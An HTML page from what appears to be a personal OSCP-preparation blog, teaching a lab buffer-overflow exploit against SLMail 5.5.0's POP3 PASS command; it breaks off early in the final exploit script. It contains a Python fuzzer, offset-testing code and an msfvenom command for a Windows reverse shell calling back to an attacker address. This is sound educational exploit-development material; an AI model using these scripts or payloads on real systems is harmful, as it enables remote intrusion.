<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Topic # I want to take the OSCP exam in 2020.
With this blog-series I want to motivate myself, document my progress and give back to the community. It also might encourage you to take the exam yourself.
In this first installment I would like to talk about &ldquo;Buffer-Overflows&rdquo;. What are they? How do they work? How can you exploit them?
I am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/OSCP/oscp-exploitdev/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="Path to OSCP - Exploit Development">
  <meta property="og:description" content="Topic # I want to take the OSCP exam in 2020.
With this blog-series I want to motivate myself, document my progress and give back to the community. It also might encourage you to take the exam yourself.
In this first installment I would like to talk about “Buffer-Overflows”. What are they? How do they work? How can you exploit them?
I am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2019-08-08T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-08-08T00:00:00+00:00">
<title>Path to OSCP - Exploit Development | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="http://localhost:1313/docs/OSCP/oscp-exploitdev/">
<link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.83bebab3890c5924fa66cd1ecb2c80beb86c0f933407ef59e20082e8b8f51813.js" integrity="sha256-g766s4kMWST6Zs0eyyyAvrhsD5M0B&#43;9Z4gCC6Lj1GBM=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>Cheatsheet</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
      <a role="button" class="">Enumeration</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Cheatsheet/enumeration/network/" class="">network</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Cheatsheet/enumeration/web/" class="">web</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
      <a role="button" class="">Active Directory</a>
    </label>
  

          
  <ul>
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle"  />
    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
      <a role="button" class="">HTB Writeups</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/the-notebook/" class="">The Notebook</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ret2plt-exploit/" class="">Exploit-Development - ret2plt</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/onetwoseven/" class="">OneTwoSeven</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/secnotes/" class="">SecNotes - WriteUp</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle" checked />
    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
      <a role="button" class="">OSCP</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-reporting/" class="">Path to OSCP</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-exploitdev/" class="active">Path to OSCP - Exploit Development</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-review/" class="">Path to OSCP - Review</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Path to OSCP - Exploit Development</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><p align="center">
  <img src="oscp-banner.png" />
</p>
<hr>
<h1 id="topic">
  Topic
  <a class="anchor" href="#topic">#</a>
</h1>
<p>I want to take the OSCP exam in 2020.</p>
<p>With this blog-series I want to motivate myself, document my progress and give back to the community.
It also might encourage you to take the exam yourself.</p>
<p>In this first installment I would like to talk about &ldquo;Buffer-Overflows&rdquo;.
What are they? How do they work? How can you exploit them?</p>
<p>I am not a developer by any means. I have exactly 0% knowledge in C or any other compiled language.
I just know a bit of &ldquo;Python3&rdquo; and &ldquo;PowerShell&rdquo;. But I managed to pull this of anyway and so can you.</p>
<p>If you are a more experienced wizard and you find some mistakes in my explanation, let me know so I can fix it here and learn faster!</p>
<p>Let&rsquo;s start!</p>
<h1 id="setup">
  Setup
  <a class="anchor" href="#setup">#</a>
</h1>
<p>My setup for this task consisted of a &ldquo;Windows 10 64Bit VM&rdquo; and a &ldquo;Kali Linux VM&rdquo; in &ldquo;VirtualBox&rdquo;.
This part should be straight forward for you. Just install both operating systems and make sure that the VMs can &ldquo;ping&rdquo; each other.
Take note about the &ldquo;IP Addresses&rdquo; of the systems. We need those shortly.</p>
<p>Next I installed &ldquo;SLMail 5.5.0&rdquo; on the &ldquo;Windows 10 VM&rdquo; as our target. If you want to follow this writeup you can get it
<a href="https://www.exploit-db.com/exploits/16399" target="_blank">here</a>. Also take note of the title of the exploit: &ldquo;POP3 &lsquo;PASS&rsquo; Remote Buffer Overflow&rdquo;.</p>
<p>I also installed &ldquo;OllyDbg&rdquo; for my debugging needs. I suggest to give &ldquo;Immunity-Debugger&rdquo; or &ldquo;x64dbg&rdquo; a try too,
&ldquo;OllyDbg&rdquo; worked but doesn&rsquo;t seem to be the first choice of more advanced exploit-devs.</p>
<p>Open &ldquo;services.mmc&rdquo; as &ldquo;administrator&rdquo; on your &ldquo;Windows VM&rdquo; just to be prepared to restart the &ldquo;SLMail&rdquo; service.
It will crash a couple of times during this journey.</p>
<p>With this, we should have everything setup.</p>
<h1 id="recon">
  Recon
  <a class="anchor" href="#recon">#</a>
</h1>
<p>I logged into my &ldquo;Kali VM&rdquo; and opened &ldquo;nmap&rdquo; and scanned the IP-Address of my &ldquo;Windows VM&rdquo;.
Besides a couple of standard Windows ports I found &ldquo;port 110&rdquo; to be open as well.</p>
<p>
  <img src="nmap-scan.png" alt="nmap-scan" /></p>
<p>This just means &ldquo;SLMail&rdquo; is running and is listening on &ldquo;port 110&rdquo; for incoming connections.
As the name and port suggest, &ldquo;SLMail&rdquo; is a small local &ldquo;mailserver&rdquo; providing the user access to their mailbox via the &ldquo;POP3&rdquo; protocol.</p>
<p>If you are not familiar with this protocol you should at least read the Wikipedia <a href="https://en.wikipedia.org/wiki/Post_Office_Protocol" target="_blank">entry for this</a>.
As the title of the exploit suggests the vulnerability resides in the <code>PASS</code> parameter. This parameter or command is part of the authentication phase like when
someone logs into their mailbox. It&rsquo;s used to tell the &ldquo;POP3&rdquo; server that you will send him your password now.</p>
<p>This is how the authentication looks like:</p>
<pre tabindex="0"><code>C:    USER x41
S:    +OK User accepted
C:    PASS SuperSecurePassword
S:    +OK Pass accepted
</code></pre><p>You can try this with &ldquo;nc&rdquo; too.</p>
<p>
  <img src="nc-pop3.png" alt="nc-pop3" /></p>
<p>To recap this phase:</p>
<p>We identified that &ldquo;POP3&rdquo; is running correctly on the &ldquo;Windows VM&rdquo;. We can send data to the service as well. You&rsquo;ll see why this is important shortly.
Because this is a demo we also know that the <code>PASS</code> command is vulnerable to a &ldquo;BufferOverflow&rdquo;. If we wouldn&rsquo;t know that, we simply would do
the next step for other parts of the application where &ldquo;user input&rdquo; is possible.</p>
<h1 id="fuzzing">
  Fuzzing
  <a class="anchor" href="#fuzzing">#</a>
</h1>
<p>At some point a developer wrote the &ldquo;POP3&rdquo; server in programming language like &ldquo;C&rdquo;. In those languages the developer is responsible
to tell the computer how much data a variable is allowed to store. For example: The variable &ldquo;UserPassword&rdquo; is allowed to take &ldquo;100 Bytes&rdquo;.
If someone would have a very long password of let&rsquo;s say &ldquo;101 Bytes&rdquo;. The application would truncate that because the &ldquo;buffer&rdquo; is too small.</p>
<p>
  <img src="meme.jpg" alt="meme" /></p>
<p>This is how it should be. If the developer forgets to be restrictive however, the application would happily accept the &ldquo;101 Byte&rdquo; long password.
Nothing prevents you to send even more data: &ldquo;200 Bytes&rdquo;, &ldquo;2000 Bytes&rdquo; - the application will take it and puts all this data into it&rsquo;s memory.
At some point however, it will crash because you have overwritten vital parts of the application itself. We will see this in action shortly.
For now we just need to know how much data we need to send the &ldquo;POP3&rdquo; service until it crashes.</p>
<p>To accomplish that I wrote a small script that connects to the &ldquo;POP3&rdquo; service, sends the <code>USER</code> command with a username as shown in the last phase
and then the <code>PASS</code> command with junk data. For simplicity I choose the letter &ldquo;A&rdquo;. Please check the comments in the code to get an overview of what it does:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import of the socket library to connect to the POP3 service</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import time to sleep 2 seconds to avoid Denial of Service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Victim IP and Port</span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.14&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># A counter variable to keep track of the amount of &#39;A&#39;s we will sent</span>
</span></span><span style="display:flex;"><span>counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop until we&#39;ve reached 5000 Bytes (5000 is just a guess - could be more, could be less)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (counter <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5000</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Build a TCP SOCKET (stream) and use it to connect to victim IP &amp; Port  </span>
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect((host, port))
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>        print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send USER command with Username x41</span>
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER x41</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>        print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send PASS command with &#39;A&#39; times the value of the counter variable (starts at 1000)</span>
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> counter <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>        print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Close connection</span>
</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Sleep 2 seconds and add 100 to the counter variable</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Print the buffersize we&#39;ve sent - this is important because we want to know at how many bytes the application will crash</span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] Buffersize </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(counter))  </span></span></code></pre></div>
<p>Before we can start using our script, let&rsquo;s attach (File -&gt; Attach) &ldquo;OllyDbg&rdquo; (run it as administrator) to the &ldquo;SLMail&rdquo; process and hit the &ldquo;run&rdquo; button.</p>
<p>
  <img src="ollydbg-attach.png" alt="ollydbg-attach" /></p>
<p>
  <img src="ollydbg-attached.png" alt="ollydbg-attached" /></p>
<p>While &ldquo;OllyDbg&rdquo; is now monitoring the process, we can start the &ldquo;Fuzzer&rdquo;.</p>
<p>
  <img src="fuzzer-start.png" alt="ollydbg-attached" /></p>
<p>The screenshot shows the server banner, then the User welcome notification.
Followed by an error (which we can ignore) and then prints the sent buffersize of &ldquo;4600 bytes&rdquo;.
This is repeated three times for this example and stops just before we get the output for &ldquo;4800 bytes&rdquo;.</p>
<p>On our &ldquo;Windows VM&rdquo; we can also see in &ldquo;OllyDbg&rdquo; that something went wrong.</p>
<p>
  <img src="ollydbg-crash1.png" alt="ollydbg-crash1" /></p>
<p>Let&rsquo;s zoom in a bit at take a look at the different windows and their content.
On the right hand-side you can the &ldquo;registers&rdquo; of the &ldquo;CPU&rdquo;. &ldquo;Registers&rdquo; are small units of memory within the &ldquo;CPU&rdquo; itself.</p>
<p>
  <img src="ollydbg-crash1-registers.png" alt="ollydbg-crash1-registers" /></p>
<p>The &ldquo;CPU&rdquo; loads data from &ldquo;RAM&rdquo; into those &ldquo;registers&rdquo; and then processes the data.
We are just interessted in two &ldquo;registers&rdquo; right now. &ldquo;EIP&rdquo; and &ldquo;ESP&rdquo; (the latter is highlighted).</p>
<p>&ldquo;EIP&rdquo; is the &ldquo;Extented Instruction Pointer&rdquo;. It tells the &ldquo;CPU&rdquo; where it needs to go after it is
done with the current operation. Currently it is pointing to the memory-location of <code>41414141</code>.</p>
<p>&ldquo;ESP&rdquo; is the &ldquo;Extented Stack Pointer&rdquo;. It always points to the top of the &ldquo;stack&rdquo;.
In this example the top of the &ldquo;stack&rdquo; is located at <code>0193A101</code>.</p>
<p>Wtf is the &ldquo;stack&rdquo;?
We can see the &ldquo;stack&rdquo; in the bottom-right corner.</p>
<p>
  <img src="ollydbg-crash1-stack.png" alt="ollydbg-crash1-stack" /></p>
<p>It is basicly just the &ldquo;RAM&rdquo; allocated for the &ldquo;SLMail&rdquo; process. The screenshot shows that the content of the &ldquo;stack&rdquo; at that location is also &ldquo;41&rsquo;s&rdquo;. It also shows, what &ldquo;41&rdquo; means. It&rsquo;s our character &ldquo;A&rdquo; we have sent in &ldquo;hex&rdquo; notation.</p>
<p>Our &ldquo;A&rsquo;s&rdquo; have overwritten &ldquo;EIP&rdquo; and crashed to program.</p>
<p>
  <img src="ollydbg-crash1-accessviolation.png" alt="ollydbg-crash1-accessviolation" /></p>
<p>This is proof that we have a &ldquo;BufferOverflow&rdquo; here. But before we move on - I need to explain how we overwrote &ldquo;EIP&rdquo; and what happened in the background.</p>
<p>It&rsquo;s rather simple. We provided more input than the application was able to handle, filling the normal buffer, overflowing into unknown space until we have overwritten so much
that we destroyed the location where the application stored the &ldquo;return&rdquo; address. This address will be loaded into &ldquo;EIP&rdquo; after we provided our &ldquo;password&rdquo;.</p>
<p>The &ldquo;return&rdquo; address is the location where the application under normal circumstances would continue it&rsquo;s operation. In this case probably doing a check
if the provided user and password is correct. But because we overwrote the &ldquo;return address&rdquo; with <code>41414141</code> (an invalid address) the program crashes.</p>
<p>This in turn means two things:</p>
<ol>
<li>We control &ldquo;EIP&rdquo; and could also write valid addresses into it - allowing us to jump to a memory location of our choosing.</li>
<li>We can put our own code on the stack, like a reverse shell, which we can run by jumping to it.</li>
</ol>
<p>Some pictures would be nice now right? I didn&rsquo;t want to steal others work, so I just <a href="http://netsec.ws/?p=180" target="_blank">link some here</a>.
They used a different tool for their example on &ldquo;BufferOverflows&rdquo;. You could use theirs to test what you&rsquo;ve learned here. I did the same.
I only started with their binary first as a try run and then popped a shell on the &ldquo;POP3&rdquo; server on my own. Anyway&hellip;.</p>
<p>Let&rsquo;s write a proof of concept &ldquo;exploit&rdquo; now.</p>
<h1 id="poc">
  POC
  <a class="anchor" href="#poc">#</a>
</h1>
<p>We can copy our &ldquo;Fuzzer&rdquo; and remove everything but the connection code. We need to add now a couple of things.
First we need to find out how many bytes we need to send exactly to the application till we overwrite &ldquo;EIP&rdquo;.
In our &ldquo;fuzzing&rdquo; phase we learned that it should be something between &ldquo;4600&rdquo; and &ldquo;4800&rdquo; bytes.</p>
<p>We can use the tool <code>pattern_create</code> to generate a &ldquo;5000 byte&rdquo; long string with a unique pattern. 5000 just to have some wiggle-room.</p>
<p>
  <img src="pattern-create.png" alt="pattern-create" /></p>
<p>Then we copy this string over to our &ldquo;exploit&rdquo;. Replace the &ldquo;&lt; PATTERN_HERE &gt;&rdquo; section.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import of the socket library to connect to the POP3 service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Victim IP and Port</span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.14&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># POC Buffer</span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &lt;PATTERN_HERE&gt; &#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build a TCP SOCKET (stream) and use it to connect to victim IP &amp; Port  </span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((host, port))
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send USER command with Username x41</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER x41</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send PASS command with our buffer</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS &#39;</span> <span style="color:#f92672">+</span> buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Close connection</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()</span></span></code></pre></div>
<p>The program crashes instantly. We can copy now the value of &ldquo;EIP&rdquo; from &ldquo;OllyDbg&rdquo; and give it a tool called <code>pattern_offset</code>.
This tool can now calculate at which position in the created pattern this value is found.</p>
<p>
  <img src="pattern-offset.png" alt="pattern-offset" /></p>
<p>We can update our code again to test if the calculated value is correct. We just send a crafted &ldquo;buffer&rdquo; again.</p>
<pre tabindex="0"><code># POC Buffer
buffer = b&#39;A&#39; * 4654
buffer += b&#39;B&#39; * 4
buffer += b&#39;C&#39; * 342
</code></pre><p>If this works, we would expect the following: The &ldquo;stack&rdquo; should hold a ton of &ldquo;A&rsquo;s&rdquo;, &ldquo;EIP&rdquo; should hold 4 &ldquo;B&rsquo;s&rdquo; and those are followed by 342 &ldquo;C&rsquo;s&rdquo;.
Let&rsquo;s try that. (Keep in mind - you might need to restart the &ldquo;SLMail&rdquo; service.)</p>
<p>
  <img src="poc-stack.png" alt="poc-stack" /></p>
<p>
  <img src="poc-eip-42.png" alt="poc-eip-42" /></p>
<p>And indeed it worked.
The next step in our process is to find so called &ldquo;bad characters&rdquo;.</p>
<h1 id="badchars">
  BadChars
  <a class="anchor" href="#badchars">#</a>
</h1>
<p>&ldquo;BadChars&rdquo; are bytes that the application can&rsquo;t handle and would break our exploit. A prime example are so called &ldquo;null bytes&rdquo; or <code>\x00</code>.
A &ldquo;null byte&rdquo; is most often used to terminate a string in programming languages. In other words: It will truncate everything after the &ldquo;null byte&rdquo;.</p>
<p>Finding them is easy but repetitive task. We swap our &ldquo;C&rsquo;s&rdquo; with all possible bytes from <code>\x00</code> till <code>\xff</code> and see which break the program.
When we found one, we&rsquo;ll remove it from the list, and try again. And again. And again.</p>
<p>
  <img src="poc-badchars.png" alt="poc-badchars" /></p>
<p>After the first run, we see nothing on the &ldquo;stack&rdquo;. So we found our first &ldquo;badchar&rdquo; <code>\x00</code>.</p>
<p>
  <img src="poc-badchar1.png" alt="poc-badchar1" /></p>
<p>So we remove it and try again.
This time we can find the sequence <code>01,02,03...</code> on the &ldquo;stack&rdquo;. But it breaks again at <code>\x0a</code>, and a third time at <code>\x0d</code>.
After finding all the &ldquo;BadChars&rdquo; the &ldquo;stack&rdquo; should look like this:</p>
<p>
  <img src="poc-badchar2.png" alt="poc-badchar2" /></p>
<p>With this knowledge we can move into the next phase. Creating our &ldquo;shellcode&rdquo;.</p>
<h1 id="shellcode">
  Shellcode
  <a class="anchor" href="#shellcode">#</a>
</h1>
<p>&ldquo;Shellcode&rdquo; is basicly a synonym for &ldquo;payload&rdquo;. It can be anything you want.
For this we want to spawn a simple &ldquo;reverse-shell&rdquo;. It forces the victim to call back to our attacker machine.</p>
<p>Our &ldquo;Kali VM&rdquo; has all the tools we need for that. I used &ldquo;msfvenom&rdquo; for this task.</p>
<p><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.18 LPORT=4444 -b '\x00\x0a\x0d' -f python</code></p>
<p>I generated &ldquo;shellcode&rdquo; for &ldquo;32Bit (x86)&rdquo; architecture, platform &ldquo;windows&rdquo;.
The payload is a &ldquo;unstaged reverse_tcp shell&rdquo;. The attacker machines &ldquo;IP&rdquo; and &ldquo;port&rdquo; and last but not least I specified the &ldquo;BadChars&rdquo;.
Those will be avoided by &ldquo;msfvenom&rdquo; when generating the &ldquo;shellcode&rdquo;.  The output looks like this:</p>
<p>
  <img src="poc-shellcode.png" alt="poc-shellcode" /></p>
<p>I copied that over into my exploit and added a bunch of <code>b'</code> because I am using python3.
I also renamed the &ldquo;buffer&rdquo; variable into &ldquo;junk&rdquo; for our &ldquo;4654 byte&rdquo; of data and &ldquo;EIP&rdquo; for our &ldquo;EIP-Overwrite&rdquo;.</p>
<p>We are almost there. Just two more things are needed. It&rsquo;s the address of a <code>JMP ESP</code> or <code>CALL ESP</code> instruction and a <code>NOP-Sled</code>.
This sound worse than it is!</p>
<h1 id="jmp-esp">
  JMP ESP
  <a class="anchor" href="#jmp-esp">#</a>
</h1>
<p>As I&rsquo;ve explained earlier, we not only overwrote &ldquo;EIP&rdquo; but wrote &ldquo;C&rsquo;s&rdquo; past that point. We removed the &ldquo;C&rsquo;s&rdquo; now and will send our &ldquo;shellcode&rdquo; instead.
The questions is now: How can we access our &ldquo;shellcode&rdquo;? Well, we control &ldquo;EIP&rdquo; and could put the address in there where our &ldquo;shellcode&rdquo; starts. However in most cases you
can&rsquo;t put the address in there directly. The address might change. But we are lucky. Our &ldquo;payload&rdquo; resides by chance in the right spot.</p>
<p>The register &ldquo;ESP&rdquo; which I told you about at the beginning holds the address to our &ldquo;shellcode&rdquo;.
To proof that I run the newest version of the &ldquo;exploit&rdquo; again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import of the socket library to connect to the POP3 service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
